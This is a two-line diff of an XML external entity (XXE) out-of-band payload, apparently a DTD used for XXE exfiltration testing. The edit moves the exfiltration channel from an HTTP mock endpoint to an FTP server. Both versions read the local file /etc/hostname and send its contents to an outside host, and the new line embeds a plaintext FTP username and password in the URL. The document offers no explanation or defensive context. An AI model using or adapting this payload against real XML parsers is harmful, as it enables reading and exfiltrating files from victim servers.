@@ -1,2 +1,2 @@
-<!ENTITY %25 three SYSTEM "file:///etc/hostname">
-<!ENTITY %25 two "<!ENTITY four SYSTEM 'http://demo9711588.mockable.io/?test=%25three;'>">
+<!ENTITY % three SYSTEM "file:///etc/hostname">
+<!ENTITY % two "<!ENTITY four SYSTEM 'ftp://unclebenz:Welcome2@ftp.drivehq.com:21/%three;'>">
